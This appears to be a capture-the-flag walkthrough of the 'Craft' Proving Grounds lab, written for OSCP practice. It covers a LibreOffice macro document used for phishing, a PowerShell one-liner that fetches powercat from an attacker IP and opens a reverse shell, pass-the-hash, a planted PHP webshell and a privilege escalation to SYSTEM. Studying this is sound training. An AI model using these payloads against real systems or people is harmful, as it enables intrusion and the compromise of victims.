---
title: PG-Craft
published: 2025-02-21
toc: true
draft: false
tags:
  - "phishing"
  - "OSCP Prep"
---

```
Scope:
192.168.198.169
```

# Recon
## Nmap

```bash
sudo nmap -sT craft -sV -sC -vvvv -T5 -p- -T5 --min-rate=5000 -Pn

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
```

Well that is unusual. Let's run a UDP scan as well for good measure.

```bash
sudo nmap -sU craft -p 161 -Pn -sC -sV

Host is up.

PORT    STATE         SERVICE VERSION
161/udp open|filtered snmp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.51 seconds
```

This is even more vague.


## 80/TCP - HTTP

![](attachments/13d77ff1bb77b2304a4623beb913538a.png)

![](attachments/7715bd0756fde4c9bc8e16da315ed297.png)

![](attachments/59edfdd8ea1062c77484bca2b5ab413c.png)

I submitted a sample `test.txt` file:

![](attachments/8e5dd79d62d7231f6ca5545877d1e0a1.png)

![](attachments/54bf524e316b319dc1ac8aae4346fd43.png)

Right, let's run `feroxbuster` first to find more juicy info first.

![](attachments/9610ab5c2f9560205180574b7f7c0fe9.png)

Seems like the intention here is for us to craft up an `.odt` file with a macro in it. In that case it would be a **phishing** scenario, where a simulated victim will click on the file, causing the macro to fire and give us a reverse shell.


## Macro crafting

I installed `LibreOffice` using the following commands

```bash
sudo apt -y update
sudo apt -y install libreoffice libreoffice-gtk4
```

I now had access to the whole suite of office tools:

![](attachments/8e91c6641d4e53ff3548c083198fe763.png)

Let's fire up `Writer` which is the same as `Microsoft Word`.

We can then find the **Macros** tab here:

![](attachments/9707499b6573eb86b477a94bc42a8845.png)

We want to create a **Basic** Macro. Click on **New** and call it whatever.

![](attachments/963735e25a2c0e273878043a20a0df43.png)

We will now want to insert our reverse shell payload, since it's a **Windows** target we'll have to use powershell.

![](attachments/b692bc2dc7edb62ff2bf5237aaa1d883.png)

![](attachments/a765b54ab533639dc563507a44ede567.png)

Save the Macro by clicking `Ctrl + s`.

Now we close the Macro window and need to initialize the Macro on our `.odt` file on opening.

![](attachments/faaf1b4cb7feacc9e43320bfe5eb1dcf.png)

![](attachments/68e5e8928dffd9eee426e948c60516d3.png)

![](attachments/18dd20af56d576a968b09f7ad805ccc2.png)

:::warning
Don't forget to write even the smallest sample text inside the file, or you will get thrown an error on upload.
:::

### Inserting Payload

We will now go ahead and upload the `.odt` file to the website, then trigger it from the `/uploads` endpoint. Thus we need to ready our listener.

![](attachments/a832cfe874d24bb912f94d60506035ce.png)

![](attachments/b5fa16997cef96377cc6e69fa02fce0e.png)

![](attachments/63d555cac5d21d020e398d5adc0ee2d7.png)

![](attachments/f2912291e8beb46c661bc8c2707dfc2c.png)

:::fail
Unfortunately the reverse shell didn't fire, let's modify it and try another payload.
:::

### Revisiting Macro

I will modify the macro like so:

```powershell
cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.207/powercat.ps1');powercat -c 192.168.45.207 -p 443 -e powershell
```

With this premise we will upload `powercat.ps1` to the webserver, which will then serve us a reverse shell.

![](attachments/394d22054c1068d122a3ff8220eef13d.png)

![](attachments/81d340c75bbfc1d34c977332a3824448.png)

Let's upload the file again.


# Foothold

After a short while the shell fires:

![](attachments/2331f2b455ac4502da04ece27e8f7ccc.png)

:::note
We have successfully *phished* our way into the target!
:::

![](attachments/1e1305115133dc8e757742592a8ffc48.png)

Let's grab the `local.txt` flag then do some enumerating:


## local.txt

![](attachments/b825100670e4d6c06f5921af0b3d9bd9.png)


## Enumerating Target

I start by checking privileges, nothing notable.

![](attachments/d938162f6fea748e66b1cef427dde75e.png)

I used `tree /F` on our user's home directory, and he has an absolute boatload of files.

I went ahead and transferred winpeas because I am lazy:

![](attachments/8cf678441c8ddccbab832ddce57af5f8.png)

![](attachments/3ce402c6f410e4c5e79c76ae53188374.png)

![](attachments/7b063a88d79a12b0fde8f6ee1493d408.png)

We found valid creds, perhaps we can log in via RDP later.

![](attachments/db0ffcffce99b1978ab48c9399c29fb6.png)

Scratch that, winrm is exposed instead, that is still a viable way to get a persistent shell.


## Hashcat

I decided to crack the hash so I could log in via `winrm` in case I had to reboot the target.

![](attachments/9a8515597cf00ec2267cdaddb2227095.png)

![](attachments/6326a0f1ec7fea5fb6f7723b28422ed3.png)

It seems the hash is uncrackable, yet we can still use it in a *pass the hash* scenario using `evil-winrm`.


# Lateral Movement

During the rest of the enumeration we find the following directory `C:\xampp\htdocs` which is the website docroot.

![](attachments/fbec2366275df18bb70c34d38006c747.png)

It seems like *apache* has full control over it, since they're HIGHLY LIKELY a service account, that means they must have the **SeImpersonatePrivilege** enabled which is standard for web service accounts.

This tells us that we need to pivot to this user in order to further escalate our privileges.

I thus went on to craft up a standard `php` webshell and uploaded it to the webroot, then accessed it from the website:

![](attachments/79f57448132dd38ae14d49358456da0f.png)

![](attachments/cd9d5fd7681e202305094636d65c838c.png)

Hell yeah it worked!

![](attachments/e2c041506ad1ccfc2a8453f31f22ce51.png)

As expected, the service account indeed has the correct privileges to get *SYSTEM*.

Let's set up another reverse shell.


## Reverse Shell

I transferred the necessary tooling for my next steps.

![](attachments/f58d2c162beed2b94252af7d3ec2205c.png)

And then created a new reverse shell.

![](attachments/82b4a09da540f551cc0e1f1fd99fb1ec.png)

![](attachments/6216c63012d737e4b2071a25b64db85f.png)

:::note
We have successfully gotten a reverse shell as *apache*.
:::

# Privilege Escalation

Now all that's left is to abuse the privileges.

![](attachments/411267d12cff0c97bdb54e55f911a66c.png)


## proof.txt

![](attachments/50f79cedaf1e522e15c4d64b80e4af16.png)

>
>Overall neat way of getting access, the phishing part was quite easy and I had no problems whatsoever.
>Important to get the methodology down afterwards for the priv-esc:
>1. Found *apache* service account? 
>2. Check web root with `icacls` 
>3. Upload webshell/reverse shell 
>4. Move laterally.

---